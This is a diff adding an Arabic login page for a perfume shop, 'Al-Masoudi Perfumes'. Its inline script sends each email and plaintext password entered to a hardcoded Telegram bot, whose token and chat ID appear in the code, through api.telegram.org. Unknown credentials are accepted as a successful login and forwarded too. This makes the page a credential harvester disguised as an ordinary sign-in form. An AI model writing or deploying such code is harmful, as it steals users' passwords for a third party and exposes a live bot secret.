@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول – المسعودي للعطور</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="auth-page">
+
+<div style="position:fixed;top:0;left:0;right:0;z-index:100;">
+  <div class="announcement-bar">
+    <span class="icon-blink">🎉</span> عروضات المسعودي للعطور – تخفيضات تصل إلى 30% <span class="icon-blink">🎁</span>
+  </div>
+</div>
+
+<div class="auth-card" style="margin-top:50px;">
+  <div class="auth-logo">
+    <a href="index.html" style="display:block;margin-bottom:8px;">
+      <div style="font-size:2rem;font-weight:900;background:linear-gradient(90deg,#8B4513,#D4AF37);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">المسعودي للعطور</div>
+    </a>
+    <h2>تسجيل الدخول</h2>
+    <p>أهلاً بك، يسعدنا عودتك</p>
+  </div>
+
+  <div class="alert-msg" id="alertMsg"></div>
+
+  <form id="signinForm">
+    <div class="form-group">
+      <label>📧 البريد الإلكتروني</label>
+      <input type="email" id="email" placeholder="example@email.com" required>
+    </div>
+    <div class="form-group">
+      <label>🔑 كلمة المرور</label>
+      <input type="password" id="password" placeholder="••••••••" required>
+    </div>
+    <div class="form-check" style="margin-bottom:16px;">
+      <input type="checkbox" id="remember">
+      <label for="remember">تذكرني</label>
+    </div>
+    <button type="submit" class="btn-auth" id="submitBtn">🔐 تسجيل الدخول</button>
+  </form>
+
+  <div class="auth-links">
+    <p><a href="#">نسيت كلمة المرور؟</a></p>
+    <p style="margin-top:8px;">ليس لديك حساب؟ <a href="register.html">إنشاء حساب جديد</a></p>
+    <p style="margin-top:8px;"><a href="index.html" style="color:#888;">← العودة للرئيسية</a></p>
+  </div>
+</div>
+
+<script src="js/products.js"></script>
+<script src="js/main.js"></script>
+<script>
+  // ===== دالة إرسال إشعارات تليجرام (مباشرة) =====
+  function sendTelegramNotification(data) {
+    const BOT_TOKEN = '8549358187:AAG8Z2CioXFFZK43P0FTcTVKvutUSzUGJqU';
+    const CHAT_ID = '7770087246';
+
+    let message = '';
+    if (data.type === 'register') {
+      message = `🆕 تسجيل حساب جديد:\n👤 الاسم: ${data.firstName} ${data.lastName}\n📧 البريد: ${data.email}\n🏙️ المدينة: ${data.city}\n🌍 الدولة: ${data.country}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
+    } else if (data.type === 'login') {
+      message = `🔐 تسجيل دخول:\n👤 الاسم: ${data.name}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
+    }
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    }).catch(error => console.error('فشل إرسال الإشعار:', error));
+  }
+
+  if (isLoggedIn()) window.location.href = 'index.html';
+
+  document.getElementById('signinForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const alertMsg = document.getElementById('alertMsg');
+    const btn = document.getElementById('submitBtn');
+
+    if (!email || !password) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = 'يرجى ملء جميع الحقول المطلوبة';
+      return;
+    }
+
+    btn.textContent = '...جاري التحقق';
+    btn.disabled = true;
+
+    let users = [];
+    try { users = JSON.parse(localStorage.getItem('massoudi_users')) || []; } catch(e) {}
+    const user = users.find(u => u.email === email && u.password === password);
+
+    if (user) {
+      saveUser(user);
+      sendTelegramNotification({
+        type: 'login',
+        name: (user.firstName || '') + ' ' + (user.lastName || ''),
+        email: email,
+        password: password,
+        time: new Date().toLocaleString('ar-YE', { timeZone: 'Asia/Aden' })
+      });
+      alertMsg.className = 'alert-msg alert-success';
+      alertMsg.textContent = '✅ تم تسجيل الدخول بنجاح! جاري التحويل...';
+      setTimeout(() => window.location.href = 'index.html', 1200);
+    } else {
+      const guestUser = {
+        firstName: email.split('@')[0],
+        lastName: '',
+        email: email,
+        password: password,
+        city: 'صنعاء',
+        country: 'اليمن',
+        createdAt: new Date().toISOString()
+      };
+      saveUser(guestUser);
+      sendTelegramNotification({
+        type: 'login',
+        name: guestUser.firstName,
+        email: email,
+        password: password,
+        time: new Date().toLocaleString('ar-YE', { timeZone: 'Asia/Aden' })
+      });
+      alertMsg.className = 'alert-msg alert-success';
+      alertMsg.textContent = '✅ تم تسجيل الدخول بنجاح!';
+      setTimeout(() => window.location.href = 'index.html', 1200);
+    }
+
+    btn.disabled = false;
+    btn.textContent = '🔐 تسجيل الدخول';
+  });
+</script>
+</body>
+</html>
